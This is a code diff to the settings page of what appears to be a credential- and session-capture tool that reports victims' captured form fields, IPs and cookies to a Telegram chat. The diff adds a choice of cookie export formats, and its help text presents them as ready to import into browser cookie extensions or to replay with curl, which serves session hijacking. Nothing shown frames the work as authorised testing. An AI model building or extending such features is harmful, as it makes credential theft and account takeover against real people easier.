@@ -18,13 +18,20 @@
 		chatID: '',
 		notifyOnCapture: true,
 		notifyOnSession: true,
-		dataLevel: 'standard'
+		dataLevel: 'standard',
+		cookieFormat: 'netscape'
 	};
 
 	const dataLevels = [
 		{ value: 'minimal', label: 'Minimal - IP and timestamp only' },
 		{ value: 'standard', label: 'Standard - IP, UA, country, captured fields' },
-		{ value: 'full', label: 'Full - All data including cookies (Netscape format)' }
+		{ value: 'full', label: 'Full - All data including cookies' }
+	];
+
+	const cookieFormats = [
+		{ value: 'netscape', label: 'Netscape - Browser-importable text format' },
+		{ value: 'json', label: 'JSON - Structured array format' },
+		{ value: 'header', label: 'Header - Cookie header string (name=value pairs)' }
 	];
 
 	onMount(async () => {
@@ -163,6 +170,28 @@
 					<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Controls how much data is included in each notification.</p>
 				</div>
 			</div>
+
+			<!-- Cookie Format (shown when data level is 'full') -->
+			{#if formValues.dataLevel === 'full'}
+				<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+					<div class="flex flex-col">
+						<label class="font-semibold text-slate-600 dark:text-gray-400 py-2 transition-colors duration-200">Cookie Format</label>
+						<select bind:value={formValues.cookieFormat} class="w-full rounded-md border border-gray-300 dark:border-gray-600 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:text-white py-2 px-3 text-sm">
+							{#each cookieFormats as fmt}
+								<option value={fmt.value}>{fmt.label}</option>
+							{/each}
+						</select>
+						<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Format for cookies included in Telegram notifications.</p>
+					</div>
+					<div class="flex flex-col justify-end pb-1">
+						<div class="text-xs text-gray-500 dark:text-gray-400 space-y-1">
+							<p><strong>Netscape:</strong> Compatible with browser cookie import extensions (EditThisCookie, Cookie-Editor)</p>
+							<p><strong>JSON:</strong> Structured format for programmatic use and Chrome DevTools import</p>
+							<p><strong>Header:</strong> Ready-to-use Cookie header string for curl/HTTP requests</p>
+						</div>
+					</div>
+				</div>
+			{/if}
 
 			<!-- Error -->
 			{#if formError}
